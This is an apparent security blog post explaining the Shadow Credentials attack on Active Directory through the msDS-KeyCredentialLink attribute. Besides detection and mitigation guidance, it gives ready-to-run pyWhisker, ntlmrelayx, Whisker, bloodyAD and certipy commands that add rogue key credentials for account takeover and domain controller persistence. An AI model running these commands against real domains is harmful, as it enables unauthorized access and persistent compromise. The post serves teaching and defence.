---
title: Shadow Credentials Attack
layout: post
date: 2025-09-20
description: "Shadow credentials is an advanced Active Directory attack technique that exploits the msDS-KeyCredentialLink attribute to gain unauthorized access and maintain persistence."
permalink: /theory/windows/AD/shadow-credentials/
---

# Shadow Credentials Attack

## Overview

Shadow credentials is an advanced Active Directory attack technique that exploits the `msDS-KeyCredentialLink` attribute to gain unauthorized access or maintain persistence within an environment. This method leverages the Windows Hello for Business (WHfB) feature, which allows users to authenticate using public key credentials.

## What are Shadow Credentials?

In a typical WHfB deployment, a user generates a key pair during enrollment. The public key is then linked to the user's object in Azure Active Directory (AAD) and subsequently synchronized to the on-premises AD's `msDS-KeyCredentialLink` attribute. This attribute facilitates key-based authentication mechanisms within the AD environment.

Attackers can abuse this mechanism by adding their own public keys to the `msDS-KeyCredentialLink` attribute of target user accounts. By doing so, they can authenticate as the compromised user without needing their password, effectively bypassing traditional credential-based authentication methods.

## How Shadow Credentials Work

### Technical Process

The Kerberos authentication protocol works with tickets to grant access. A Service Ticket (ST) can be obtained by presenting a Ticket Granting Ticket (TGT). The TGT can only be obtained by validating pre-authentication, which can be done symmetrically (with DES, RC4, AES128 or AES256 keys) or asymmetrically (with certificates). The asymmetrical pre-authentication is called PKINIT.

1. **Key Pair Generation:** Attackers create an RSA key pair (public/private)
2. **Certificate Creation:** Create an X509 certificate configured with the public key
3. **KeyCredential Structure:** Create a KeyCredential structure featuring the raw public key and add it to the `msDS-KeyCredentialLink` attribute
4. **PKINIT Authentication:** Authenticate using PKINIT with the certificate and private key to obtain a TGT

### Key Components

- **msDS-KeyCredentialLink Attribute:** The AD attribute that stores key credential information (introduced with Windows Server 2016)
- **KeyCredentialLink Object:** Contains public key information for certificate-based authentication
- **PKINIT:** Kerberos extension that enables public key authentication (present since Windows 2000)
- **Windows Hello for Business:** The legitimate feature that this attack technique abuses
- **X509 Certificates:** Used for asymmetric pre-authentication in Kerberos

## Attack Prerequisites

### Domain Requirements

To perform a shadow credentials attack, the domain must meet these criteria:

- Domain supports PKINIT and contains at least one Domain Controller running Windows Server 2016 or above
- Domain Controller(s) has its own key pair for session key exchange (happens when AD CS is enabled or when a certificate authority is in place)
- The `msDS-KeyCredentialLink` feature is available (introduced with Windows Server 2016)

### Required Permissions

The attacker needs:

- **GenericWrite** or **GenericAll** permissions on the target account
- **WriteProperty** permissions on the `msDS-KeyCredentialLink` attribute
- Control over an account that can edit the target object's `msDS-KeyCredentialLink` attribute

### Target Account Requirements

- Target account must support certificate-based authentication
- Account must not be in the "Protected Users" group
- Account must have valid UPN (User Principal Name)
- For computer objects: can only edit their own `msDS-KeyCredentialLink` attribute if KeyCredential is not already set

## Attack Methodology

### Step 1: Identify Target Accounts

The attacker selects a user or computer account to target, typically focusing on:
- Service accounts with high privileges
- Administrative accounts
- Computer accounts for persistence

### Step 2: Create Key Pair and Certificate

```bash
# Create an RSA key pair
# Create an X509 certificate configured with the public key
```

### Step 3: Add Shadow Credentials

#### Using pyWhisker (UNIX-like systems)

```bash
# List existing shadow credentials
pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_SAMNAME" --action "list"

# Add shadow credentials
pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_SAMNAME" --action "add"
```

#### Using ntlmrelayx with pyWhisker

```bash
# Relay NTLM authentication and add shadow credentials
ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'
```

### Step 4: Authenticate with Certificate

Once the public key has been set in the `msDS-KeyCredentialLink` of the target, the certificate generated can be used with Pass-the-Certificate to obtain a TGT and further access.

### Special Case: Self-Edit KCL Attribute

**Important distinction:**
- **User objects** can't edit their own `msDS-KeyCredentialLink` attribute
- **Computer objects** can edit their own `msDS-KeyCredentialLink` attribute (if KeyCredential is not already set)

This enables scenarios like:
1. Trigger an NTLM authentication from DC01
2. Relay it to DC02
3. Use pywhisker to edit DC01's attribute
4. Create a Kerberos PKINIT pre-authentication backdoor
5. Maintain persistent access to DC01 with PKINIT and pass-the-cache

## Detection Methods

### Event Log Monitoring

Monitor for the following events:
- **Event ID 5136:** A directory service object was modified
- **Event ID 4662:** An operation was performed on an object
- **Event ID 4768:** A Kerberos authentication ticket (TGT) was requested

### PowerShell Detection

```powershell
# Find accounts with shadow credentials
Get-ADUser -Filter {msDS-KeyCredentialLink -ne $null} -Properties msDS-KeyCredentialLink

# Find computers with shadow credentials
Get-ADComputer -Filter {msDS-KeyCredentialLink -ne $null} -Properties msDS-KeyCredentialLink

# Detailed shadow credentials information
Get-ADUser -Identity "target_user" -Properties msDS-KeyCredentialLink | Select-Object -ExpandProperty msDS-KeyCredentialLink
```

### SIEM Detection Rules

Monitor for Event ID 5136 with the following conditions:
- `winlog.event_data.AttributeLDAPDisplayName:"msDS-KeyCredentialLink"`
- `winlog.event_data.AttributeValue :B\:828*` (indicates KeyCredential structure)
- Exclude legitimate Microsoft Online services (`not winlog.event_data.SubjectUserName: MSOL_*`)

### Monitoring Directory Service Modifications

Detecting unauthorized modifications to the `msDS-KeyCredentialLink` attribute is crucial for identifying potential abuses of shadow credentials. In environments without WHfB or hybrid AAD join, any modification to this attribute should be considered suspicious.

## Prevention and Mitigation

### Access Control

1. **Principle of Least Privilege:** Limit GenericWrite and GenericAll permissions
2. **Regular Auditing:** Monitor for unusual permission grants
3. **Protected Users Group:** Add sensitive accounts to Protected Users group

### Monitoring

1. **Event Log Monitoring:** Monitor for msDS-KeyCredentialLink modifications
2. **Certificate Monitoring:** Monitor for unusual certificate requests
3. **Authentication Monitoring:** Monitor for certificate-based authentication

### Technical Controls

1. **Restrict Permissions:** Limit the ability to modify the `msDS-KeyCredentialLink` attribute to only necessary accounts and services
2. **Implement Monitoring:** Set up alerts for changes to the `msDS-KeyCredentialLink` attribute, especially for high-privilege accounts
3. **Regular Audits:** Periodically review the `msDS-KeyCredentialLink` attributes of user accounts to ensure no unauthorized keys are present

## Common Attack Scenarios

### GenericWrite → Shadow Credentials Attack

**Prerequisites:** Attacker has GenericWrite or GenericAll permissions on target account

**Attack Flow:**
1. **Add Shadow Credentials:** Use tools like bloodyAD, certipy, or pyWhisker to add key credentials to target account
2. **Request Certificate:** Generate certificate using the added shadow credentials
3. **Authenticate:** Use certificate for PKINIT authentication to obtain TGT
4. **Lateral Movement/Persistence:** Use obtained access for further compromise

**Target Types:**
- **Service Accounts:** For lateral movement and service impersonation
- **Computer Accounts:** For persistence and domain controller access
- **High-Privilege Accounts:** For privilege escalation and administrative access
- **Regular Users:** For account takeover and credential theft

## Tools and Exploitation

### Primary Tools

#### pyWhisker
```bash
# List shadow credentials on target
pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_SAMNAME" --action "list"

# Add shadow credentials to target
pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_SAMNAME" --action "add"

# Remove shadow credentials from target
pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_SAMNAME" --action "remove"
```

#### ntlmrelayx Integration
```bash
# Automatically add shadow credentials during NTLM relay
ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'
```

#### Whisker (Windows)
```bash
# List shadow credentials
Whisker.exe list /target:target_user /domain:domain.com /dc:dc.domain.com

# Add shadow credentials
Whisker.exe add /target:target_user /domain:domain.com /dc:dc.domain.com

# Remove shadow credentials
Whisker.exe remove /target:target_user /domain:domain.com /dc:dc.domain.com /deviceid:device-id
```

#### bloodyAD
```bash
# Add shadow credentials to target account
bloodyAD -d domain.com --host 10.10.10.10 -u user -p password add shadowCredentials target_account

# Remove shadow credentials from target account
bloodyAD -d domain.com --host 10.10.10.10 -u user -p password remove shadowCredentials target_account
```

#### certipy shadow
```bash
# Automatically add shadow credentials and request certificate
certipy shadow -dc-ip 10.10.10.10 -u user -p password -account target_account auto

```

## References

- [Tenable - Shadow Credentials Indicator of Exposure](https://www.tenable.com/indicators/ioe/ad/C-SHADOW-CREDENTIALS)
- [The Hacker Recipes - Shadow Credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
- [Elastic Security - Potential Shadow Credentials Detection](https://www.elastic.co/guide/en/security/8.19/potential-shadow-credentials-added-to-ad-object.html)
- [I-Tracing - DACL Shadow Credentials](https://i-tracing.com/blog/dacl-shadow-credentials/)